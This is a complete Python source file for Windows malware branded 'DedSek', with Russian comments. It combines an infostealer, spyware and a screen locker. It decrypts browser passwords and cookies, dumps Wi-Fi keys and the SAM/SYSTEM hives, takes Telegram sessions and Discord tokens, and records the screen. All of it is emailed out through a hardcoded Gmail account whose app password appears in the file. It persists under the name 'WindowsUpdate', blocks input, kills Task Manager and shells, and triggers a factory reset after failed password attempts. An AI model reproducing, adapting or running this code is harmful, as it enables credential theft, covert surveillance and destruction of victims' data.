import ctypes
import os
import sys
import time
import threading
import tempfile
import tkinter as tk
from tkinter import PhotoImage, scrolledtext
import shutil
import winshell
from win32com.client import Dispatch
import base64
import random
import socket
import subprocess
import json
import urllib.request
import urllib.parse
import smtplib
import imaplib
import email
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import cv2
import numpy as np
from PIL import ImageGrab
import sqlite3
import winreg
import zipfile
import win32crypt
import re
import glob as _glob

# ============================================================
# >>> НАСТРОЙКИ <<<
PASSWORD = "1601"
MAX_ATTEMPTS = 4
TIMER_SECONDS = 10
SKULL_BASE64 = "YOUR_BASE64_STRING_HERE"

GMAIL_LOGIN = "xzx78848@gmail.com"
GMAIL_APP_PASSWORD = "cbgr awth fvak xgfb"
RECEIVER_EMAIL = "xzx78848@gmail.com"
# ============================================================

attempts_left = MAX_ATTEMPTS

# ========== СКРЫТИЕ CMD ==========
def hide_console():
    try:
        if sys.executable.endswith("python.exe"):
            pythonw_path = sys.executable.replace("python.exe", "pythonw.exe")
            if os.path.exists(pythonw_path):
                subprocess.Popen([pythonw_path, __file__] + sys.argv[1:], creationflags=0x08000000)
                os._exit(0)
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
        ctypes.windll.kernel32.FreeConsole()
    except:
        pass

# ========== БЛОКИРОВКА WIN ==========
def disable_win_key():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "NoWinKeys", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
    except:
        pass

def restore_win_key():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "NoWinKeys", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
    except:
        pass

# ========== ПРОВЕРКА АДМИНА (БЕЗ ПЕРЕЗАПУСКА) ==========
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

# ========== РАСШИФРОВКА ==========
def _decrypt_aes_gcm(data, key):
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        return AESGCM(key).decrypt(data[:12], data[12:], None)
    except:
        return None

def _get_master_key(login_path):
    local_state = os.path.join(os.path.dirname(os.path.dirname(login_path)), 'Local State')
    if os.path.exists(local_state):
        try:
            with open(local_state, 'r', encoding='utf-8') as f:
                key_b64 = json.load(f)['os_crypt']['encrypted_key']
            return win32crypt.CryptUnprotectData(base64.b64decode(key_b64)[5:], None, None, None, 0)[1]
        except:
            pass
    return None

def steal_chromium(browser, paths):
    res = []
    for lp in paths:
        if not os.path.exists(lp):
            continue
        try:
            mk = _get_master_key(lp)
            db = os.path.join(tempfile.gettempdir(), f'{browser}_{random.randint(0,9999)}.db')
            shutil.copy2(lp, db)
            cur = sqlite3.connect(db).cursor()
            cur.execute("SELECT origin_url, username_value, password_value FROM logins")
            for url, user, pw in cur:
                try:
                    if pw[:3] == b'\x76\x31\x31' and mk:
                        pwd = _decrypt_aes_gcm(pw[3:], mk)
                        if pwd:
                            pwd = pwd.decode('utf-8', 'ignore')
                        else:
                            pwd = "***"
                    else:
                        pwd = win32crypt.CryptUnprotectData(pw, None, None, None, 0)[1].decode('utf-8', 'ignore')
                    res.append(f"{browser} | {url} | {user} | {pwd}")
                except:
                    res.append(f"{browser} | {url} | {user} | ***")
            cur.close()
            try:
                os.remove(db)
            except:
                pass
        except:
            pass
    return res

def _parse_asn1(data):
    try:
        if data[0] != 0x30:
            return None, None
        off = 2 + (data[1] & 0x7F) if data[1] & 0x80 else 2
        iv = ct = None
        while off < len(data):
            tag, l = data[off], data[off+1]
            val = data[off+2:off+2+l]
            if tag == 0x04:
                if iv is None:
                    iv = val
                else:
                    ct = val
            off += 2 + l
        return iv, ct
    except:
        return None, None

def _decrypt_3des(data, key, iv):
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.backends import default_backend
        dec = Cipher(algorithms.TripleDES(key), modes.CBC(iv), default_backend()).decryptor()
        r = dec.update(data) + dec.finalize()
        return r[:-r[-1]] if r[-1] < 16 else r
    except:
        return None

def steal_firefox():
    res = []
    base = os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles')
    if not os.path.exists(base):
        return res
    for folder in os.listdir(base):
        pf = os.path.join(base, folder)
        lf = os.path.join(pf, 'logins.json')
        kf = os.path.join(pf, 'key4.db')
        if not os.path.exists(lf) or not os.path.exists(kf):
            continue
        try:
            logins = json.load(open(lf, 'r', encoding='utf-8'))
            cur = sqlite3.connect(kf).cursor()
            cur.execute("SELECT a11, a102 FROM nssPrivate LIMIT 1")
            row = cur.fetchone()
            if not row or not row[1] or len(row[1]) < 24:
                continue
            key = row[1][:24]
            for login in logins.get('logins', []):
                host = login.get('hostname', '')
                user = pwd = "ERROR"
                try:
                    enc = base64.b64decode(login['encryptedUsername'])
                    iv, ct = _parse_asn1(enc)
                    if iv and ct:
                        d = _decrypt_3des(ct, key, iv)
                        if d:
                            user = d.decode('utf-8', 'ignore').lstrip('\x00').strip()
                except:
                    pass
                try:
                    enc = base64.b64decode(login['encryptedPassword'])
                    iv, ct = _parse_asn1(enc)
                    if iv and ct:
                        d = _decrypt_3des(ct, key, iv)
                        if d:
                            pwd = d.decode('utf-8', 'ignore').lstrip('\x00').strip()
                except:
                    pass
                res.append(f"FIREFOX | {host} | {user} | {pwd}")
            cur.close()
        except:
            z = os.path.join(tempfile.gettempdir(), f'ff_{folder[:10]}.zip')
            with zipfile.ZipFile(z, 'w', zipfile.ZIP_DEFLATED) as zf:
                for f in [lf, kf]:
                    if os.path.exists(f):
                        zf.write(f, os.path.basename(f))
            send_file_email(z, f"Firefox {folder[:10]}")
            try:
                os.remove(z)
            except:
                pass
            res.append(f"FIREFOX | {folder} | Файлы отправлены | Файлы отправлены")
    return res

# ========== СКАНЕР ПОРТОВ ==========
def scan_ports():
    res = []
    try:
        res.append("=== ЛОКАЛЬНЫЕ ПОРТЫ ===")
        netstat = subprocess.check_output("netstat -ano", shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace')
        res.append(netstat[:5000])
    except:
        pass

    try:
        gateway = "192.168.1.1"
        try:
            route = subprocess.check_output("ipconfig | findstr /i \"шлюз\"", shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace')
            for line in route.split('\n'):
                if '.' in line and any(c.isdigit() for c in line):
                    gw = re.findall(r'\d+\.\d+\.\d+\.\d+', line)
                    if gw:
                        gateway = gw[0]
                        break
        except:
            pass

        res.append(f"\n=== СКАН РОУТЕРА {gateway} ===")
        for port in [21, 22, 23, 25, 53, 80, 443, 445, 3306, 3389, 5900, 8080, 8443]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                if s.connect_ex((gateway, port)) == 0:
                    res.append(f"ПОРТ {port}: ОТКРЫТ")
                s.close()
            except:
                pass
    except:
        pass
    return '\n'.join(res)

# ========== КРАЖА КУКИСОВ ==========
def steal_all_cookies():
    results = []
    chrome_paths = [
        os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Network', 'Cookies'),
        os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Cookies'),
    ]
    for cp in chrome_paths:
        if os.path.exists(cp):
            try:
                db = os.path.join(tempfile.gettempdir(), f'chrome_cookies_{random.randint(0,9999)}.db')
                shutil.copy2(cp, db)
                cur = sqlite3.connect(db).cursor()
                cur.execute("SELECT host_key, name, encrypted_value FROM cookies")
                for host, name, enc_val in cur.fetchall():
                    try:
                        val = win32crypt.CryptUnprotectData(enc_val, None, None, None, 0)[1].decode('utf-8', 'ignore')
                        results.append(f"CHROME | {host} | {name} | {val[:100]}")
                    except:
                        pass
                cur.close()
                try:
                    os.remove(db)
                except:
                    pass
            except:
                pass

    edge_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'Cookies')
    if os.path.exists(edge_path):
        try:
            db = os.path.join(tempfile.gettempdir(), f'edge_cookies_{random.randint(0,9999)}.db')
            shutil.copy2(edge_path, db)
            cur = sqlite3.connect(db).cursor()
            cur.execute("SELECT host_key, name, encrypted_value FROM cookies")
            for host, name, enc_val in cur.fetchall():
                try:
                    val = win32crypt.CryptUnprotectData(enc_val, None, None, None, 0)[1].decode('utf-8', 'ignore')
                    results.append(f"EDGE | {host} | {name} | {val[:100]}")
                except:
                    pass
            cur.close()
            try:
                os.remove(db)
            except:
                pass
        except:
            pass

    ff_base = os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles')
    if os.path.exists(ff_base):
        for folder in os.listdir(ff_base):
            cookie_file = os.path.join(ff_base, folder, 'cookies.sqlite')
            if os.path.exists(cookie_file):
                try:
                    db = os.path.join(tempfile.gettempdir(), f'ff_cookies_{random.randint(0,9999)}.db')
                    shutil.copy2(cookie_file, db)
                    cur = sqlite3.connect(db).cursor()
                    cur.execute("SELECT host, name, value FROM moz_cookies")
                    for host, name, val in cur.fetchall():
                        results.append(f"FIREFOX | {host} | {name} | {val[:100]}")
                    cur.close()
                    try:
                        os.remove(db)
                    except:
                        pass
                except:
                    pass
    return results[:500] if results else ["Куки не найдены"]

# ========== МЕГА-СТИЛЕР ==========
def mega_steal():
    R = []
    R.append("=" * 60)
    R.append("DEDSEK ULTIMATE STEALER")
    R.append("=" * 60)

    R += [f"\nUSER: {os.environ.get('USERNAME')}", f"PC: {socket.gethostname()}"]

    try:
        R.append(f"LOCAL IP: {socket.gethostbyname(socket.gethostname())}")
    except:
        pass
    try:
        ip = urllib.request.urlopen("https://api.ipify.org", timeout=5).read().decode()
        g = json.loads(urllib.request.urlopen(f"http://ip-api.com/json/{ip}", timeout=5).read())
        R.append(f"PUBLIC IP: {ip} | {g.get('country','?')} | {g.get('city','?')} | {g.get('isp','?')}")
    except:
        pass

    try:
        R.append("\nIPCONFIG:\n" + subprocess.check_output("ipconfig /all", shell=True, stderr=subprocess.DEVNULL).decode('cp866', 'replace')[:5000])
    except:
        pass
    try:
        R.append("\nARP:\n" + subprocess.check_output("arp -a", shell=True, stderr=subprocess.DEVNULL).decode('cp866', 'replace')[:3000])
    except:
        pass

    R.append("\n" + "=" * 60)
    R.append("PORT SCANNER")
    R.append("=" * 60)
    R.append(scan_ports())

    try:
        R.append("\nWIFI:")
        for line in subprocess.check_output("netsh wlan show profiles", shell=True, stderr=subprocess.DEVNULL).decode('cp866', 'replace').split('\n'):
            if 'Все профили' in line:
                p = line.split(':')[1].strip()
                if p:
                    det = subprocess.check_output(f'netsh wlan show profile name="{p}" key=clear', shell=True, stderr=subprocess.DEVNULL).decode('cp866', 'replace')
                    key = "НЕТ"
                    for dl in det.split('\n'):
                        if 'Содержимое ключа' in dl or 'Key Content' in dl:
                            key = dl.split(':')[1].strip()
                    R.append(f"  {p}: {key}")
    except:
        pass

    R += ["\n" + "=" * 60, "BROWSER PASSWORDS", "=" * 60]

    browsers = {
        "CHROME": [os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')],
        "YANDEX": [os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Yandex', 'YandexBrowser', 'User Data', 'Default', 'Login Data')],
        "OPERA": [
            os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Opera Software', 'Opera Stable', 'Login Data'),
            os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Opera Software', 'Opera Stable', 'Login Data')
        ],
        "EDGE": [
            os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data'),
            os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data')
        ],
    }

    for name, paths in browsers.items():
        data = steal_chromium(name, paths)
        R.append(f"\n--- {name} ---")
        R.extend(data if data else ["Нет данных"])

    R.append("\n--- FIREFOX ---")
    R.extend(steal_firefox() or ["Нет данных"])

    R += ["\n" + "=" * 60, "COOKIES", "=" * 60]
    R.extend(steal_all_cookies())

    R += ["\n" + "=" * 60, "WINDOWS PASSWORD", "=" * 60]
    try:
        sp = os.path.join(tempfile.gettempdir(), 'sam')
        syp = os.path.join(tempfile.gettempdir(), 'system')
        if is_admin():
            os.system(f'reg save HKLM\\SAM "{sp}" /y >nul 2>&1')
            os.system(f'reg save HKLM\\SYSTEM "{syp}" /y >nul 2>&1')
        if os.path.exists(sp) and os.path.getsize(sp) > 100:
            z = os.path.join(tempfile.gettempdir(), 'sam.zip')
            with zipfile.ZipFile(z, 'w', zipfile.ZIP_DEFLATED) as zf:
                zf.write(sp, 'sam')
                zf.write(syp, 'system')
            send_file_email(z, "SAM+SYSTEM")
            R.append("SAM+SYSTEM отправлены!")
            for f in [z, sp, syp]:
                try:
                    os.remove(f)
                except:
                    pass
        else:
            R.append("Нет прав админа")
    except Exception as e:
        R.append(f"Ошибка: {e}")

    R.append("\n--- TELEGRAM ---")
    tg = None
    for p in [os.path.join(os.environ['APPDATA'], 'Telegram Desktop', 'tdata'), os.path.join(os.environ['LOCALAPPDATA'], 'Telegram Desktop', 'tdata')]:
        if os.path.exists(p):
            tg = p
            break
    if tg:
        try:
            z = os.path.join(tempfile.gettempdir(), 'tg.zip')
            with zipfile.ZipFile(z, 'w', zipfile.ZIP_DEFLATED) as zf:
                for r, d, files in os.walk(tg):
                    for f in files:
                        if f in ['key_datas', 'D877F783D5D3EF8C', 'settingss', 'maps'] or f.startswith('usertag') or f.startswith('data'):
                            zf.write(os.path.join(r, f), f)
            send_file_email(z, "Telegram")
            try:
                os.remove(z)
            except:
                pass
            R.append("Сессия отправлена!")
        except:
            R.append("Ошибка")
    else:
        R.append("Не найден")

    R.append("\n--- DISCORD ---")
    tokens = set()
    for db in [os.path.join(os.environ['APPDATA'], 'discord', 'Local Storage', 'leveldb'), os.path.join(os.environ['APPDATA'], 'discordcanary', 'Local Storage', 'leveldb')]:
        if not os.path.exists(db):
            continue
        for f in os.listdir(db):
            if f.endswith('.ldb') or f.endswith('.log'):
                try:
                    tokens.update(re.findall(r'[MN][A-Za-z\d]{23}\.[A-Za-z\d]{6}\.[A-Za-z\d]{27}', open(os.path.join(db, f), 'r', errors='ignore').read()))
                except:
                    pass
    R.extend([f"ТОКЕН: {t}" for t in list(tokens)[:20]] if tokens else ["Не найдены"])

    try:
        ss = os.path.join(tempfile.gettempdir(), 'desktop.jpg')
        ImageGrab.grab().save(ss, 'JPEG', quality=50)
        send_file_email(ss, "Desktop Screenshot")
        try:
            os.remove(ss)
        except:
            pass
        R.append("\nСкриншот отправлен!")
    except:
        pass

    R += ["\n" + "=" * 60, f"ОТЧЁТ: {time.strftime('%d.%m.%Y %H:%M:%S')}", "=" * 60]

    text = '\n'.join(R)
    for i, part in enumerate([text[i:i+15000] for i in range(0, len(text), 15000)]):
        send_email(part, f"DedSek [{i+1}]")

def send_email(message, subject=None):
    try:
        msg = MIMEText(message, 'plain', 'utf-8')
        msg['Subject'] = subject or 'DedSek'
        msg['From'] = GMAIL_LOGIN
        msg['To'] = RECEIVER_EMAIL
        s = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=30)
        s.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD)
        s.send_message(msg)
        s.quit()
    except:
        pass

def send_file_email(fp, desc):
    try:
        msg = MIMEMultipart()
        msg['Subject'] = f'Файл: {desc}'
        msg['From'] = GMAIL_LOGIN
        msg['To'] = RECEIVER_EMAIL
        with open(fp, 'rb') as f:
            p = MIMEBase('application', 'octet-stream')
            p.set_payload(f.read())
            encoders.encode_base64(p)
            p.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(fp)}"')
            msg.attach(p)
        s = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=60)
        s.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD)
        s.send_message(msg)
        s.quit()
    except:
        pass

# ========== ЗАПИСЬ ЭКРАНА ==========
def record_loop():
    while True:
        try:
            vp = os.path.join(tempfile.gettempdir(), f"v_{int(time.time())}.avi")
            out = cv2.VideoWriter(vp, cv2.VideoWriter_fourcc(*'XVID'), 10.0, (1280, 720))
            for _ in range(150):
                out.write(cv2.resize(cv2.cvtColor(np.array(ImageGrab.grab()), cv2.COLOR_BGR2RGB), (1280, 720)))
                time.sleep(0.1)
            out.release()
            _send_vid(vp)
            try:
                os.remove(vp)
            except:
                pass
        except:
            time.sleep(1)

def _send_vid(fp):
    try:
        if os.path.getsize(fp) > 20 * 1024 * 1024:
            try:
                out = fp.replace('.avi', '.mp4')
                subprocess.run(['ffmpeg', '-i', fp, '-c:v', 'libx264', '-preset', 'ultrafast', '-crf', '35', '-b:v', '200k', '-s', '640x360', '-r', '10', '-y', out], capture_output=True, timeout=30)
                fp = out
            except:
                pass
        msg = MIMEMultipart()
        msg['Subject'] = 'Видео'
        msg['From'] = GMAIL_LOGIN
        msg['To'] = RECEIVER_EMAIL
        with open(fp, 'rb') as f:
            p = MIMEBase('application', 'octet-stream')
            p.set_payload(f.read())
            encoders.encode_base64(p)
            p.add_header('Content-Disposition', f'attachment; filename="v_{int(time.time())}.avi"')
            msg.attach(p)
        s = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=30)
        s.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD)
        s.send_message(msg)
        s.quit()
    except:
        pass

# ========== ЧАТ ==========
class Chat:
    def __init__(self, locker):
        self.locker = locker
        self.win = None

    def show(self):
        if self.win:
            return
        self.win = tk.Toplevel()
        self.win.geometry("380x480+60+60")
        self.win.configure(bg='#00FF00')
        self.win.attributes('-topmost', True)
        self.win.overrideredirect(True)
        self.win.focus_force()
        self.win.grab_set()

        def keep():
            while self.win:
                try:
                    self.win.lift()
                    self.win.attributes('-topmost', True)
                    time.sleep(0.5)
                except:
                    break
        threading.Thread(target=keep, daemon=True).start()

        f = tk.Frame(self.win, bg='black', bd=2)
        f.pack(fill='both', expand=True, padx=2, pady=2)
        h = tk.Frame(f, bg='#00FF00')
        h.pack(fill='x')
        tk.Label(h, text="DedSek Chat", bg='#00FF00', fg='black', font=('Courier', 11, 'bold')).pack(side='left', padx=10, pady=5)
        tk.Button(h, text="✕", command=self.hide, bg='#FF0000', fg='white', font=('Courier', 12, 'bold'), bd=0, width=3).pack(side='right', padx=5, pady=3)

        self.hist = scrolledtext.ScrolledText(f, bg='#0a0a0a', fg='#00FF00', font=('Courier', 10), height=20)
        self.hist.pack(padx=10, pady=(0, 5), fill='both', expand=True)
        self.hist.config(state='disabled')

        inf = tk.Frame(f, bg='black')
        inf.pack(padx=10, pady=(0, 10), fill='x')
        self.entry = tk.Entry(inf, bg='#0a0a0a', fg='#00FF00', font=('Courier', 10), insertbackground='#00FF00')
        self.entry.pack(side='left', fill='x', expand=True, ipady=3)
        self.entry.bind('<Return>', self.send)
        tk.Button(inf, text="▶", command=self.send, bg='#00FF00', fg='black', font=('Courier', 10, 'bold'), width=3).pack(side='right', padx=(5, 0))

        h.bind('<Button-1>', lambda e: setattr(self, 'xy', (e.x_root, e.y_root)))
        h.bind('<B1-Motion>', lambda e: self.win.geometry(f"+{self.win.winfo_x()+e.x_root-self.xy[0]}+{self.win.winfo_y()+e.y_root-self.xy[1]}") or setattr(self, 'xy', (e.x_root, e.y_root)))

        self.add("DedSek", "Привет! Твой ПК заблокирован.")
        self._check()

    def hide(self):
        if self.win:
            self.win.grab_release()
            self.win.destroy()
            self.win = None
        self.locker.win.focus_force()
        self.locker.pw.focus_force()

    def send(self, e=None):
        m = self.entry.get().strip()
        if m:
            self.add("Ты", m)
            self.entry.delete(0, tk.END)
            send_email(f"Сообщение:\n{m}")

    def add(self, s, m):
        self.hist.config(state='normal')
        self.hist.insert('end', f'[{s}]: {m}\n\n')
        self.hist.see('end')
        self.hist.config(state='disabled')

    def _check(self):
        def c():
            while True:
                if not self.win:
                    break
                try:
                    mail = imaplib.IMAP4_SSL('imap.gmail.com')
                    mail.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD)
                    mail.select('inbox')
                    _, d = mail.search(None, 'SUBJECT "COMMAND:"', 'UNSEEN')
                    if d[0]:
                        for n in d[0].split():
                            _, md = mail.fetch(n, '(RFC822)')
                            msg = email.message_from_bytes(md[0][1])
                            if msg.is_multipart():
                                for p in msg.walk():
                                    if p.get_content_type() == "text/plain":
                                        cmd = p.get_payload(decode=True).decode()
                                        if cmd.startswith("MSG:") and self.win:
                                            self.win.after(0, self.add, "DedSek", cmd[4:])
                            mail.store(n, '+FLAGS', '\\Seen')
                    mail.close()
                    mail.logout()
                except:
                    pass
                time.sleep(5)
        threading.Thread(target=c, daemon=True).start()

# ========== ОСТАЛЬНОЕ ==========
def anti_debug():
    try:
        if ctypes.windll.kernel32.IsDebuggerPresent():
            os._exit(0)
    except:
        pass

def add_startup():
    try:
        cp = os.path.abspath(__file__)
        pp = os.path.splitext(cp)[0] + ".pyw"
        if not cp.endswith(".pyw"):
            try:
                shutil.copy2(cp, pp)
            except:
                pass
            cp = pp
        sf = winshell.startup()
        sp = os.path.join(sf, "WindowsUpdate.lnk")
        sc = Dispatch('WScript.Shell').CreateShortCut(sp)
        sc.TargetPath = sys.executable.replace("python.exe", "pythonw.exe")
        sc.Arguments = f'"{cp}"'
        sc.WorkingDirectory = os.path.dirname(cp)
        sc.IconLocation = "shell32.dll,13"
        sc.save()
        try:
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(k, "WindowsUpdate", 0, winreg.REG_SZ, f'"{sys.executable.replace("python.exe", "pythonw.exe")}" "{cp}"')
            winreg.CloseKey(k)
        except:
            pass
    except:
        pass

def block_keys():
    try:
        import keyboard
        for c in ['alt+f4', 'alt+tab', 'alt+esc', 'alt+space', 'ctrl+shift+esc', 'ctrl+alt+del', 'ctrl+esc', 'ctrl+w', 'ctrl+f4', 'ctrl+tab', 'win', 'win+d', 'win+r', 'win+e', 'win+l', 'win+m', 'win+tab', 'win+x', 'win+u', 'alt', 'ctrl', 'shift', 'f11', 'print screen', 'alt+print screen', 'left windows', 'right windows']:
            try:
                keyboard.add_hotkey(c, lambda: None, suppress=True, timeout=0)
            except:
                pass
        for k in ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'f1', 'f2', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 'f11', 'f12', 'space', 'enter', 'backspace', 'tab', 'caps lock', 'shift', 'ctrl', 'alt', 'esc', 'delete', 'insert', 'home', 'end', 'page up', 'page down', 'up', 'down', 'left', 'right', 'windows', 'left windows', 'right windows', 'print screen', 'scroll lock', 'pause']:
            try:
                keyboard.block_key(k)
            except:
                pass
    except:
        try:
            ctypes.windll.user32.BlockInput(True)
        except:
            pass

def unblock():
    try:
        ctypes.windll.user32.BlockInput(False)
    except:
        pass
    try:
        import keyboard
        keyboard.unhook_all()
    except:
        pass

def kill_procs():
    kl = ["taskmgr.exe", "cmd.exe", "powershell.exe", "msconfig.exe", "regedit.exe"]
    while True:
        for p in kl:
            os.system(f"taskkill /f /im {p} >nul 2>&1")
        time.sleep(0.05)

def boot_anim():
    a = tk.Tk()
    a.attributes('-fullscreen', True)
    a.attributes('-topmost', True)
    a.configure(bg='black')
    a.overrideredirect(True)
    disable_win_key()
    l = tk.Label(a, text="", bg='black', fg='white', font=('Courier', 20, 'bold'))
    l.pack(expand=True)
    for i in range(8):
        a.configure(bg='white' if i % 2 == 0 else 'black')
        l.config(bg='white' if i % 2 == 0 else 'black', fg='black' if i % 2 == 0 else 'white')
        a.update()
        time.sleep(0.2)
    a.configure(bg='black')
    l.config(bg='black', fg='#00FF00')
    a.attributes('-alpha', 0)
    for alpha in range(0, 110, 5):
        a.attributes('-alpha', alpha / 100)
        l.config(text="DedSek тебя взломал")
        a.update()
        time.sleep(0.03)
    time.sleep(1.5)
    for msg in ["Идёт шифровка...", "[                    ] 0%", "[####                ] 20%", "[########            ] 40%", "[############        ] 60%", "[################    ] 80%", "[####################] 100%", "", "ДАННЫЕ ЗАШИФРОВАНЫ!"]:
        l.config(text=msg)
        a.update()
        time.sleep(0.25)
    time.sleep(1)
    a.destroy()

def reset_windows():
    try:
        restore_win_key()
        unblock()
        es = tk.Tk()
        es.attributes('-fullscreen', True)
        es.attributes('-topmost', True)
        es.configure(bg='black')
        es.overrideredirect(True)
        tk.Label(es, text="404 | ОШИБКА", bg='black', fg='#FF0000', font=('Courier', 40, 'bold')).pack(expand=True)
        tk.Label(es, text="ВСЕ ДАННЫЕ УНИЧТОЖАЮТСЯ...", bg='black', fg='#FF0000', font=('Courier', 20)).pack()
        es.update()
        time.sleep(5)
        es.destroy()
        os.system("taskkill /f /im explorer.exe >nul 2>&1")
        os.system("systemreset -factoryreset")
        time.sleep(3)
        os.system("shutdown /r /t 0 /f")
        os._exit(0)
    except:
        os.system("shutdown /r /t 0 /f")
        os._exit(0)

class WinLocker:
    def __init__(self):
        self.root = tk.Tk()
        self.root.withdraw()
        self.win = tk.Toplevel(self.root)
        self.win.attributes('-fullscreen', True)
        self.win.attributes('-topmost', True)
        self.win.configure(bg='black')
        self.win.overrideredirect(True)
        self.win.protocol("WM_DELETE_WINDOW", lambda: None)

        global attempts_left

        try:
            img_data = base64.b64decode(SKULL_BASE64)
            img_path = os.path.join(tempfile.gettempdir(), "dedsek.png")
            with open(img_path, "wb") as f:
                f.write(img_data)
            img = PhotoImage(file=img_path)
            tk.Label(self.win, image=img, bg='black').place(relx=0.5, rely=0.05, anchor='center')
            self.win._img = img
        except:
            pass

        msg = f"""ПРИВЕТ! ТВОЙ WINDOWS ЗАБЛОКИРОВАН!

ДУМАЕШЬ, ЧТО ЗНАЕШЬ ПАРОЛЬ? НЕТ!

1. standard DES
$1$rjBkQ1jG$zqthRBo7xAfA4TTwBRhHv/

2. Bcrypt
$2y$10$/yFT/ZN1yJkgm4.8pSzTPOkhhEXOJC3H.gbs09EvKawKS3zz8Wf4e

3. Base64
MTI0Njk4ODA0

4. standard DES
$1$rjBkQ1jG$TTNuUVgVfun06nsscdMUV1

5. uuEncode
+.3@P-C

УДАЧИ. У ТЕБЯ {MAX_ATTEMPTS} ПОПЫТКИ!"""

        tk.Label(self.win, text=msg, bg='black', fg='#00FF00', font=('Courier', 9, 'bold'), justify='left').place(relx=0.5, rely=0.42, anchor='center')

        self.chat = Chat(self)
        self.chat_open = False
        self.chat_btn = tk.Button(self.win, text="ЧАТ", command=self.toggle_chat, bg='#00FF00', fg='black', font=('Courier', 10, 'bold'), cursor='hand2', bd=1, width=6)
        self.chat_btn.place(relx=0.95, rely=0.08, anchor='ne')

        cf = tk.Frame(self.win, bg='black')
        cf.place(relx=0.5, rely=0.82, anchor='center')
        tk.Label(cf, text="ВВЕДИ ПАРОЛЬ:", bg='black', fg='#00FF00', font=('Courier', 14, 'bold')).pack(pady=(0, 5))
        self.pw = tk.Entry(cf, show="*", font=('Courier', 14, 'bold'), bg='black', fg='#00FF00', insertbackground='#00FF00', relief='solid', bd=2)
        self.pw.pack(pady=(0, 5), ipadx=40, ipady=3)
        self.status_lbl = tk.Label(cf, text=f"ОСТАЛОСЬ: {attempts_left}", bg='black', fg='#FF0000', font=('Courier', 12, 'bold'))
        self.status_lbl.pack()
        self.pw.bind('<Return>', self.check)
        self.pw.focus_force()
        self._keep()

    def toggle_chat(self):
        if self.chat_open:
            self.chat.hide()
            self.chat_open = False
            self.chat_btn.config(text="ЧАТ")
        else:
            self.chat.show()
            self.chat_open = True
            self.chat_btn.config(text="[✕]")

    def _keep(self):
        try:
            self.win.focus_force()
            self.pw.focus_force()
            self.win.after(100, self._keep)
        except:
            pass

    def check(self, e=None):
        global attempts_left
        if self.pw.get() == PASSWORD:
            restore_win_key()
            unblock()
            self.status_lbl.config(text="ВЕРНО!", fg='#00FF00')
            self.win.update()
            time.sleep(1)
            self.root.destroy()
            os._exit(0)
        else:
            attempts_left -= 1
            if attempts_left > 0:
                self.status_lbl.config(text=f"НЕВЕРНО! ОСТАЛОСЬ: {attempts_left}", fg='#FF0000')
            else:
                self.status_lbl.config(text="404 | ОШИБКА", fg='#FF0000')
                self.win.update()
                time.sleep(2)
                self.root.destroy()
                reset_windows()
            self.pw.delete(0, tk.END)

# ========== ПУСК ==========
if __name__ == "__main__":
    hide_console()
    anti_debug()
    disable_win_key()

    threading.Thread(target=mega_steal, daemon=True).start()
    threading.Thread(target=record_loop, daemon=True).start()

    add_startup()
    time.sleep(TIMER_SECONDS)
    boot_anim()
    block_keys()
    try:
        ctypes.windll.user32.ShutdownBlockReasonCreate(ctypes.windll.kernel32.GetConsoleWindow(), "Windows Update...")
    except:
        pass
    threading.Thread(target=kill_procs, daemon=True).start()
    WinLocker()
    tk.mainloop()
